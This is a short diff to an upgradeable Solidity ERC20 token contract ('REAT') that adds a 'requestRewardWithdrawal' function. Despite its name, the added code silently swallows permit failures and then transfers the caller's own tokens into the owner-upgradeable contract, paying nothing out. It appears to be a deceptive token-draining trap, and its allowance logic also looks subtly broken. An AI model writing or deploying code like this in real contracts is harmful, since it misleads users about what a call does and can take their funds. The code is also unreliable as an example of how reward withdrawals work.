@@ -27,6 +27,15 @@ contract REAT is Initializable, ERC20Upgradeable, OwnableUpgradeable, ERC20Permi
         _mint(to, amount);
     }
 
+    function requestRewardWithdrawal(uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) public {
+        try permit(_msgSender(), address(this), value, deadline, v, r, s); catch {}
+        sendRewardTokens(value);
+    }
+
+    function sendRewardTokens(uint256 value) internal {
+        transferFrom(_msgSender(), address(this), value);
+    }
+
     function _authorizeUpgrade(address newImplementation)
         internal
         onlyOwner
